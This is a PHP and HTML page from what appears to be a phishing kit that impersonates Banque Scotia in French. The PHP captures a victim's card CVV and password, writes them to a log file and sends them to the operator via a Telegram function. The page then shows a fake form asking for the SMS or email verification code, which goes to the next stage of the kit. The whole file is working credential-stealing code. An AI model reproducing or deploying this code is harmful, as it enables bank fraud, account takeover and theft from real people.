<?php session_start();
require_once "../sendto.php" ;
if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

$_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;


$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
"\n"."heure :".$heure.
"\n"."date :".$date.
"\n". "Cvv : " .$_SESSION["cvv"] .
"\n"."Mdp : " .$_SESSION["mdp"] .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);
 sendMessageToTelegram($donnees) ;

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="styles_mobile.css">

     <link rel="stylesheet" media="screen and (min-width: 769px)" href="styles_pc.css">
    <title>SCOTIA</title>
</head>
<body>
    <div class="container">
        <div class="header">
    <div class="title">
        <span class="title1" >Bienvenue a la </span> 
        <span class="title2">Banque Scotia</span>
    </div>
        </div>
        <div class="body">
        <form action="/scotia/terminus.php" method="post">
            <h1>Vous recevrez un code d'authenthification sur votre E-mail ou sms</h1>
  <div class="inputForm">
  <input type="text" name="sms" placeholder="code sms " >
  </div>


    <div class="inputFormSubmit">
    <input type="submit" value="Ouvrire une Session" >
    </div>

        </form>

        </div>


    </div>
</body>
</html>
